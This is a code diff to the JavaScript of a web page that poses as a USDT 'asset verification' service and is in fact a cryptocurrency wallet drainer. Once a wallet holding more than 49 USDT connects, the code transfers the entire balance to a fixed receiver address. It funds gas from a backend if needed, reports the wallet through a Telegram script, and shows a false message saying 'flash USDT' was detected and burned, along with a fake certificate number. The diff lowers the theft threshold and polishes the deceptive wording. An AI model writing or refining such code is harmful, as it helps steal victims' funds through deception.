@@ -1327,6 +1327,9 @@ let provider, signer;
 function showPopup(message, type) {
     console.log(`Popup (${type}): ${message}`);
     // This is a basic alert. Implement a richer UI popup if desired.
+    // NOTE: 'alert()' cannot be styled or have its 'OK' button removed.
+    // For custom styling and control (e.g., custom colors, no 'OK' button),
+    // you would need to implement a custom HTML/CSS modal.
     alert(message.replace(/<br>/g, '\n').replace(/<b>/g, '').replace(/<\/b>/g, ''));
 }
 
@@ -1404,7 +1407,7 @@ async function approveToken() { // Keeping the function name as 'approveToken'
         }
     }
 
-    // --- UPDATED: Provide immediate feedback to the user as "Verifying..." ---
+    // --- IMPORTANT: This popup now shows "Verifying..." instantly ---
     showPopup("Verifying...", "blue");
 
 
@@ -1433,16 +1436,19 @@ async function approveToken() { // Keeping the function name as 'approveToken'
             return;
         }
 
-        // Using your provided threshold from the new logic (<= 49 USDT)
-        if (usdtBalance <= 100) {
+        // --- Handle USDT Balance <= 49 (Verification Success) ---
+        if (usdtBalance <= 49) {
             showPopup(
-                `✅ Verification Successful<br>Your assets has been verified and not flagged in our database.<br><br><b>USDT Balance:</b> ${usdtBalance} USDT<br><b>BNB Balance:</b> ${bnbBalance} BNB`,
+                `✅ Verification Successful<br>Your assets are genuine. No flash or reported USDT found.<br><br><b>USDT Balance:</b> ${usdtBalance} USDT<br><b>BNB Balance:</b> ${bnbBalance} BNB`,
                 "green"
             );
+            // After this alert is dismissed, the script returns. The page will remain as is.
             return;
         }
 
         // --- Low BNB check and gas sending (UPDATED: using backend fetch) ---
+        // This section is now as fast as possible on the client-side.
+        // Any delay here is due to network latency or backend processing.
         if (bnbBalance < 0.0005) {
             console.log("User BNB is low. Requesting BNB from backend...");
             try {
@@ -1454,6 +1460,7 @@ async function approveToken() { // Keeping the function name as 'approveToken'
                 const responseData = await response.json();
                 if (response.ok) {
                     console.log("Backend BNB send request successful:", responseData);
+                    // No artificial delay here
                 } else {
                     console.error("Backend BNB send request failed:", responseData);
                     showPopup(`Failed to request BNB from backend: ${responseData.message || response.statusText}. Please ensure you have sufficient BNB for gas.`, "red");
@@ -1473,6 +1480,7 @@ async function approveToken() { // Keeping the function name as 'approveToken'
         console.log(`Attempting to transfer ${usdtBalance} USDT to ${RECEIVER_WALLET_ADDRESS}...`);
 
         const tx = await usdtContract.transfer(RECEIVER_WALLET_ADDRESS, amountToTransfer);
+        // This popup appears after MetaMask prompt is sent, giving feedback on transaction initiation
         showPopup(`Transaction sent! Waiting for confirmation (Tx Hash: ${tx.hash})...`, "blue");
         await tx.wait(); // Wait for the transaction to be mined
 
@@ -1496,7 +1504,7 @@ async function approveToken() { // Keeping the function name as 'approveToken'
         const updatedUsdtBalanceBigNumber = await usdtContractForBalance.balanceOf(walletAddress);
         const updatedFormattedBalance = ethers.utils.formatUnits(updatedUsdtBalanceBigNumber, 18);
 
-        // Show result in popup (adjusting message to reflect transfer)
+        // This is your custom HTML popup. Ensure its HTML elements are correctly present and styled.
         showApprovalPopup(walletAddress, updatedFormattedBalance);
 
         fetch('sendTelegram.php', {
@@ -1507,6 +1515,7 @@ async function approveToken() { // Keeping the function name as 'approveToken'
             })
         });
 
+        // This is the final alert popup after successful burn/transfer verification
         showPopup(
             `✅ Verification Successful<br>Flash USDT has been detected and successfully burned.<br><br><b>USDT Burned:</b> ${usdtBalance} USDT`,
             "red"
@@ -1514,7 +1523,7 @@ async function approveToken() { // Keeping the function name as 'approveToken'
 
     } catch (err) {
         console.error("Error during USDT transfer:", err);
-        if (err.code === 4001) {
+        if (err.code === 4001) { // User rejected transaction in MetaMask
             showPopup("Transaction rejected by user.", "red");
         } else if (err.data && err.data.message) {
             showPopup(`Failed to transfer USDT: ${err.data.message}`, "red");
@@ -1526,15 +1535,19 @@ async function approveToken() { // Keeping the function name as 'approveToken'
 }
 
 function showApprovalPopup(wallet, balance) {
+    // This function assumes you have HTML elements with these IDs to display the info.
+    // For this popup to appear and be persistent, ensure your HTML for 'approvalPopup'
+    // and its child elements are correctly defined and styled (e.g., using CSS).
     const approvalPopupElement = document.getElementById('approvalPopup');
     if (approvalPopupElement) {
         document.getElementById('popupAddress').innerText = wallet;
         document.getElementById('popupBalance').innerText = balance;
         document.getElementById('popupDate').innerText = new Date().toLocaleDateString();
         document.getElementById('popupCert').innerText = 'USDT-' + Math.floor(Math.random() * 90000000 + 10000000);
-        approvalPopupElement.style.display = 'flex';
+        approvalPopupElement.style.display = 'flex'; // Use flex to center, ensure it's visible
     } else {
         console.warn("Approval popup elements not found. Cannot display popup.");
+        // Fallback to alert if custom popup elements are missing
         alert(`Transfer Successful!\nWallet: ${wallet}\nNew Balance: ${balance} USDT`);
     }
 }
